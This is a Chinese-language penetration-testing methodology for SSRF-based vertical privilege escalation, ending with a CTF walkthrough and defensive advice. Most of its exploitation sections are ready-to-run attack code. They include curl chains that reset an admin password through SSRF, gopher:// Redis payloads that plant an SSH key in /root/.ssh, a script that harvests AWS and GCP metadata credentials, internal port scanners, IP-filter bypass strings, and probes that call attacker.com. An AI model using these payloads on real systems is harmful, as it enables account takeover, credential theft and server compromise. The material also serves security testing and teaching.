# SSRF 垂直权限提升攻击方法论

## 1. 技术介绍

### 1.1 漏洞原理

SSRF 垂直权限提升是一种组合攻击技术，利用 SSRF（服务器端请求伪造）漏洞绕过基于网络位置的访问控制，从而访问仅限特权用户或内部系统才能访问的资源，实现从低权限到高权限的 escalation。

**核心攻击链:**
```
普通用户认证 → SSRF 漏洞 → 绕过 IP 基础访问控制 → 访问管理端点 → 权限提升
```

### 1.2 漏洞本质

SSRF 垂直权限提升的本质是**信任边界违规**：应用程序错误地假设"来自 localhost 的请求是可信的"，将网络位置（IP 地址）作为唯一的授权依据，而忽略了请求的实际发起者可能是通过 SSRF 代理的外部攻击者。

### 1.3 典型场景

| 场景 | 描述 | 风险等级 |
|-----|------|---------|
| localhost 限制的管理端点 | 仅限 127.0.0.1 访问的管理功能 | 高 |
| 内网服务隔离 | 仅限内网访问的 API/服务 | 高 |
| 云元数据保护 | 通过 IP 限制访问云元数据服务 | 中 |
| Docker 容器间隔离 | 容器间网络访问控制 | 中 |

---

## 2. 攻击常见于哪些业务场景

### 2.1 IP 基础认证场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 管理后台 | /admin/* 端点限制 localhost 访问 | 攻击者通过 SSRF 从服务器发起请求，绕过 IP 限制 |
| 密码重置 | /reset_password 仅限内部调用 | SSRF 可重置任意用户密码 |
| 系统配置 | /config/* 端点限制内网访问 | SSRF 可读取/修改系统配置 |
| 运维接口 | /ops/*、/internal/* 端点 | SSRF 可执行运维操作 |

### 2.2 网络隔离场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 微服务架构 | 内部服务间 API 调用 | SSRF 可访问未授权微服务 |
| 数据库管理 | 数据库管理界面限制内网 | SSRF 可访问数据库管理功能 |
| 缓存服务 | Redis/Memcached 内网访问 | SSRF 可读写缓存数据 |
| 消息队列 | RabbitMQ/Kafka 管理界面 | SSRF 可访问消息队列管理 |

### 2.3 云环境场景

| 业务场景 | 功能示例 | 风险点描述 |
|---------|---------|-----------|
| 云元数据服务 | 169.254.169.254 访问限制 | SSRF 可获取实例凭证 |
| 容器元数据 | ECS 任务元数据端点 | SSRF 可获取容器 IAM 角色 |
| 服务发现 | 内部服务注册与发现 | SSRF 可探测内部服务拓扑 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 识别 IP 基础访问控制

**探测方法:**
```bash
# 直接访问管理端点（应被拒绝）
curl http://target.com/admin/dashboard
# 返回：403 Forbidden 或 401 Unauthorized

# 检查错误消息是否提示 IP 限制
curl -i http://target.com/internal/api/users
# 返回：HTTP/1.1 403 Forbidden
# 响应体：Access denied. Only localhost allowed.
```

**判断标准:**
- 返回 403 且提示 IP/网络限制 → 可能存在 IP 基础访问控制
- 返回 401 但无 IP 提示 → 可能是普通认证限制
- 连接被拒绝/超时 → 可能是网络层隔离

#### 3.1.2 识别 SSRF 端点

**常见 SSRF 输入点:**
```
# URL 参数
?url=
&redirect=
&fetch=
&download=
&image_url=
&avatar_url=
&webhook_url=
&callback=

# 文件上传
&profile_picture_url=
&import_from_url=

# API 端点
POST /api/proxy
POST /api/fetch
POST /api/webhook/test
```

**探测 Payload:**
```bash
# 测试 URL 参数是否发起请求
curl "http://target.com/profile?avatar_url=http://attacker.com/test"

# 检查服务器日志是否有来自目标的请求
# 或使用带外检测（DNSLog、HTTP 回调）
curl "http://target.com/profile?avatar_url=http://your-domain.burpcollaborator.net/"
```

#### 3.1.3 验证 SSRF 绕过 IP 限制

**验证步骤:**
```bash
# 步骤 1: 确认直接访问被拒绝
curl http://target.com/admin/reset-password?user=admin
# 返回：403 Forbidden

# 步骤 2: 通过 SSRF 访问
curl -X POST http://target.com/profile \
    -d "profile_picture_url=http://127.0.0.1/admin/reset-password?user=admin"

# 步骤 3: 检查响应
# 如果返回成功（200 OK）或密码重置确认 → SSRF 绕过成功
```

### 3.2 白盒测试

#### 3.2.1 代码审计关键词

**IP 检查模式:**
```python
# 危险模式：仅检查 remote_addr
@app.route('/admin/reset-password')
def reset_password():
    if request.remote_addr != '127.0.0.1':
        return 'Unauthorized', 403
    # ... 执行敏感操作

# 危险模式：检查 X-Forwarded-For 但未验证
@app.route('/admin/config')
def config():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if not ip.startswith('10.'):
        return 'Unauthorized', 403
    # ... 执行敏感操作

# 危险模式：硬编码 IP 列表
ALLOWED_IPS = ['127.0.0.1', '10.0.0.1', '192.168.1.1']
if request.remote_addr not in ALLOWED_IPS:
    abort(403)
```

**SSRF 危险函数:**
```python
# Python SSRF 危险函数
urllib.request.urlopen(user_url)
urllib.request.urlretrieve(user_url, filename)
requests.get(user_url)
httpx.get(user_url)

# 检查这些函数的输入是否经过验证
```

#### 3.2.2 数据流追踪

1. 定位 IP 检查的端点
2. 查找应用中所有发起 HTTP 请求的代码
3. 确认 HTTP 请求的 URL 是否用户可控
4. 验证 URL 验证逻辑是否可被绕过

---

## 4. 漏洞利用方法

### 4.1 基础权限提升

#### 4.1.1 绕过 localhost 密码重置

**目标**: 重置管理员密码

**攻击步骤:**
```bash
# 步骤 1: 注册并登录普通用户
curl -X POST http://localhost:37053/register \
    -d "username=attacker&password=pass123" \
    -c cookies.txt

# 步骤 2: 利用 SSRF 重置 admin 密码
curl -X POST http://localhost:37053/profile \
    -b cookies.txt \
    -d "profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=hacked123"

# 步骤 3: 登出当前用户
curl http://localhost:37053/logout -b cookies.txt

# 步骤 4: 以 admin 身份登录
curl -X POST http://localhost:37053/login \
    -d "username=admin&password=hacked123" \
    -c admin_cookies.txt

# 步骤 5: 访问管理员功能
curl http://localhost:37053/admin/dashboard -b admin_cookies.txt
```

#### 4.1.2 访问内部管理 API

**目标**: 获取内部 API 数据

**攻击步骤:**
```python
import requests

# 普通用户会话
session = requests.Session()
session.post('http://target.com/login', data={
    'username': 'attacker',
    'password': 'pass123'
})

# 通过 SSRF 访问内部 API
internal_endpoints = [
    'http://127.0.0.1:8080/internal/api/users',
    'http://127.0.0.1:8080/internal/api/config',
    'http://127.0.0.1:8080/internal/api/secrets'
]

for endpoint in internal_endpoints:
    response = session.post('http://target.com/api/fetch', json={
        'url': endpoint
    })

    if response.status_code == 200:
        print(f'[+] Accessed: {endpoint}')
        print(f'    Data: {response.text[:200]}')
```

### 4.2 内网服务访问

#### 4.2.1 访问 Redis 服务

**目标**: 未授权访问 Redis

**攻击步骤:**
```bash
# 通过 SSRF 发送 Redis 命令
# 使用 gopher:// 协议（如果支持）

# 方法 1: 读取 Redis 键
curl -X POST http://target.com/fetch \
    -d "url=gopher://127.0.0.1:6379/_GET%20secret_key"

# 方法 2: 写入恶意数据
curl -X POST http://target.com/fetch \
    -d "url=gopher://127.0.0.1:6379/_SET%20session:admin%20%22{\\\"role\\\":\\\"admin\\\"}%22"

# 方法 3: 配置持久化写入 SSH 密钥
curl -X POST http://target.com/fetch \
    -d "url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20/root/.ssh"
```

#### 4.2.2 访问 Docker 内部服务

**目标**: 容器内服务

**攻击步骤:**
```python
import requests

session = requests.Session()
session.cookies.set('session', USER_SESSION)

# 扫描 Docker 内部网络
for host in ['172.17.0.1', '172.17.0.2', '172.17.0.3']:
    for port in [80, 443, 8080, 3000, 5000]:
        ssrf_url = f'http://{host}:{port}/'

        try:
            response = session.post('http://target.com/proxy', json={
                'url': ssrf_url
            }, timeout=3)

            if response.status_code == 200:
                print(f'[+] Found service: {ssrf_url}')
                print(f'    Response: {response.text[:100]}')
        except:
            pass
```

### 4.3 云环境权限提升

#### 4.3.1 获取 AWS 凭证

**目标**: EC2 实例元数据

**攻击步骤:**
```bash
# 步骤 1: 访问实例元数据
curl -X POST http://target.com/fetch \
    -d "url=http://169.254.169.254/latest/meta-data/"

# 步骤 2: 获取 IAM 角色名称
curl -X POST http://target.com/fetch \
    -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# 步骤 3: 获取临时凭证
curl -X POST http://target.com/fetch \
    -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"

# 返回:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "..."
# }

# 步骤 4: 使用凭证访问 AWS 服务
aws s3 ls --access-key ASIA... --secret-key ... --session-token ...
```

#### 4.3.2 获取 GCP 服务账户令牌

**目标**: GCP 元数据服务

**攻击步骤:**
```bash
# GCP 需要 Metadata-Flavor 头（某些 SSRF 可绕过）
curl -X POST http://target.com/fetch \
    -d "url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
    -H "Metadata-Flavor: Google"

# 如果应用代理请求时保留自定义头，可获取令牌
```

---

## 5. 漏洞利用绕过方法

### 5.1 绕过 IP 黑名单

**场景**: 应用黑名单包含常见内网 IP

```bash
# 使用 IPv6 回环地址
http://[::1]/admin/

# 使用十进制 IP
http://2130706433/  # 127.0.0.1

# 使用八进制 IP
http://0177.0.0.1/

# 使用短写形式
http://127.1/  # 127.0.0.1
http://127.0.1/

# 使用 URL 编码
http://127.0.0.1%00/admin/
http://127.0.0.1%252fadmin/

# 使用重定向绕过
# attacker.com 302 重定向到 127.0.0.1
http://attacker.com/ → http://127.0.0.1/admin/
```

### 5.2 绕过协议限制

**场景**: 应用仅允许 http/https 协议

```bash
# 使用 HTTP 协议（通常允许）
http://127.0.0.1/admin/

# 使用 HTTPS（如果服务支持）
https://127.0.0.1/admin/

# 使用 FTP（有时被忽略）
ftp://127.0.0.1/

# 使用 data:// 协议（如果应用处理响应）
data://text/plain,GET /admin/ HTTP/1.1%0D%0AHost:127.0.0.1
```

### 5.3 绕过端口限制

**场景**: 应用限制仅允许标准端口

```bash
# 使用 URL 语法混淆
http://127.0.0.1:80@127.0.0.1:8080/admin/
# 某些解析器会访问 127.0.0.1:8080

# 使用 DNS 重定向
# attacker.com:80 → 127.0.0.1:8080
http://attacker.com/admin/
```

### 5.4 盲注 SSRF 权限提升

**场景**: 应用不返回 SSRF 响应内容

```python
import requests
import time

def detect_internal_access():
    """通过时间差检测内部访问成功"""

    targets = [
        'http://127.0.0.1/admin/reset-password?user=admin',
        'http://127.0.0.1:8080/internal/api/config',
        'http://10.0.0.1/admin/'
    ]

    for url in targets:
        start = time.time()

        try:
            response = requests.post('http://target.com/proxy', json={
                'url': url
            }, timeout=10)

            elapsed = time.time() - start

            # 成功访问内部服务通常响应较快
            # 超时或错误通常响应较慢
            if elapsed < 2:
                print(f'[+] Fast response ({elapsed:.2f}s): {url}')
                print(f'    Status: {response.status_code}')
            else:
                print(f'[-] Slow response ({elapsed:.2f}s): {url}')

        except requests.exceptions.Timeout:
            print(f'[-] Timeout: {url}')
        except Exception as e:
            print(f'[-] Error: {url} - {e}')
```

---

## 6. 实战攻击链示例

### 6.1 Synthwave User Portal 完全攻陷

**目标**: Flask 用户门户应用

**前置条件**:
- 应用有 SSRF 漏洞（profile_picture_url 参数）
- 存在 localhost 限制的密码重置端点
- 管理员账户可查看 FLAG

**完整攻击链:**

```bash
# 步骤 1: 注册普通账户
curl -X POST http://localhost:37053/register \
    -d "username=ssrf_attacker&password=attack123&first_name=SSRF&last_name=Attacker&email=ssrf@attack.com" \
    -c cookies.txt

# 步骤 2: 登录
curl -X POST http://localhost:37053/login \
    -d "username=ssrf_attacker&password=attack123" \
    -b cookies.txt -c cookies.txt

# 步骤 3: 利用 SSRF 重置 admin 密码
curl -X POST http://localhost:37053/profile \
    -b cookies.txt \
    -d "first_name=SSRF&last_name=Attacker&email=ssrf@attack.com" \
    -d "profile_picture_url=http://127.0.0.1/reset_password?username=admin&newpassword=pwned_via_ssrf"

# 步骤 4: 验证密码重置成功
# 响应中应包含 "Password reset successfully"

# 步骤 5: 登出
curl http://localhost:37053/logout -b cookies.txt

# 步骤 6: 以 admin 身份登录
curl -X POST http://localhost:37053/login \
    -d "username=admin&password=pwned_via_ssrf" \
    -c admin_cookies.txt

# 步骤 7: 获取 FLAG
curl http://localhost:37053/profile -b admin_cookies.txt | grep -oP 'FLAG\{[^}]+\}'

# 输出：FLAG{6405c2f787acd0c63e0812b1f377e35d55753310c8c30c98183ed63ec23a5e2d}
```

**攻击时间**: < 5 分钟
**攻击复杂度**: 低

### 6.2 企业内网渗透

**目标**: 企业内网应用

**前置条件**:
- Web 应用存在 SSRF 漏洞
- 内网有未授权访问的 Redis 服务
- Redis 可写入 WebShell

**完整攻击链:**

```python
import requests
import base64

session = requests.Session()

# 步骤 1: 登录 Web 应用
session.post('http://webapp.example.com/login', data={
    'username': 'employee',
    'password': 'corp_pass123'
})

# 步骤 2: 通过 SSRF 扫描内网
internal_services = []
for host in ['10.0.0.1', '10.0.0.2', '10.0.0.3', '10.0.0.4']:
    for port in [80, 443, 6379, 3306, 8080]:
        try:
            response = session.post('http://webapp.example.com/proxy', json={
                'url': f'http://{host}:{port}/'
            }, timeout=2)

            if response.status_code == 200:
                internal_services.append(f'http://{host}:{port}/')
                print(f'[+] Found: http://{host}:{port}/')
        except:
            pass

# 步骤 3: 发现 Redis 服务 (10.0.0.3:6379)
# 通过 SSRF 写入 SSH 密钥到 Redis
ssh_pubkey = 'ssh-rsa AAAA... attacker@kali'

redis_commands = [
    f'CONFIG SET dir /root/.ssh',
    f'CONFIG SET dbfilename authorized_keys',
    f'SET crackit "\\n\\n{ssh_pubkey}\\n\\n"',
    'SAVE'
]

for cmd in redis_commands:
    encoded_cmd = base64.b64encode(cmd.encode()).decode()
    ssrf_url = f'gopher://10.0.0.3:6379/_{encoded_cmd}'

    response = session.post('http://webapp.example.com/proxy', json={
        'url': ssrf_url
    })
    print(f'Executed: {cmd}')

# 步骤 4: SSH 登录 Redis 服务器
# ssh -i attacker_key root@10.0.0.3
```

---

## 7. 检测与防御建议

### 7.1 检测 SSRF 垂直权限提升

**网络层检测:**
- 监控应用服务器发起的 localhost/内网连接
- 检测对管理端点的异常访问模式
- 检测 SSRF 特征请求（如 gopher:// 协议）

**应用层检测:**
- 审计所有 IP 基础访问控制的端点
- 检查 URL 参数的验证逻辑
- 监控敏感操作的执行来源

### 7.2 防御 SSRF 垂直权限提升

**URL 验证:**
```python
import socket
import ipaddress
from urllib.parse import urlparse

def is_safe_url(url):
    """验证 URL 是否安全"""
    parsed = urlparse(url)

    # 协议白名单
    if parsed.scheme not in ['https']:
        return False

    # 域名/IP 验证
    hostname = parsed.hostname
    if not hostname:
        return False

    try:
        ip = socket.gethostbyname(hostname)
        ip_obj = ipaddress.ip_address(ip)

        # 禁止私有地址、回环地址、链路本地地址
        if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
            return False

        # 禁止云元数据
        if str(ip) == '169.254.169.254':
            return False

        return True
    except:
        return False
```

**强认证机制:**
```python
# 不要仅依赖 IP 进行认证
@app.route('/admin/reset-password')
def reset_password():
    # 错误做法：仅检查 IP
    # if request.remote_addr != '127.0.0.1':
    #     return 'Unauthorized', 403

    # 正确做法：使用强认证
    if not current_user.is_authenticated:
        return redirect(url_for('login'))

    if not current_user.is_admin:
        return 'Forbidden', 403

    # 执行敏感操作...
```

**网络隔离:**
- 使用防火墙规则限制应用服务器的出站连接
- 将管理端点部署在独立网络区域
- 实施零信任网络架构

---

## 8. 参考资源

- [OWASP SSRF Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF Labs](https://portswigger.net/web-security/ssrf)
- [SSRF 测试 Payload 集合](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md)
